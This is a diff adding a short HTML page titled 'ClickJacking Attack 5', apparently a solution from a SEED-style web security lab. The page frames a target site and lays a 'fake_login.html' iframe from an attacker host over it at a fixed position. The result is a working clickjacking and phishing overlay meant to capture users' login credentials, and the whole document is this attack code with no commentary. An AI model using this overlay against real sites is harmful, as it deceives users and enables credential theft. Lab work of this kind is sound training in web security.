@@ -1,0 +1,23 @@
+<html>
+<head>
+<title>ClickJacking Attack 5</title>
+<style type="text/css">
+   #outer  {position:absolute; top:0px; left:0px}
+   #inner  {position:absolute; top:320px; left:70px; opacity:1.0;}
+</style>
+</head>
+
+<body>
+
+<iframe id="outer" src="http://www.seed-server.com"
+        style="border:0px; width:800px; height:1500px;">
+</iframe>
+
+<iframe id="inner" src="http://www.attacker32.com/attack/fake_login.html"
+        scrolling="no"
+        style="border:0px; width:800px; height:230px;">
+</iframe>
+
+</body>
+</html>
+
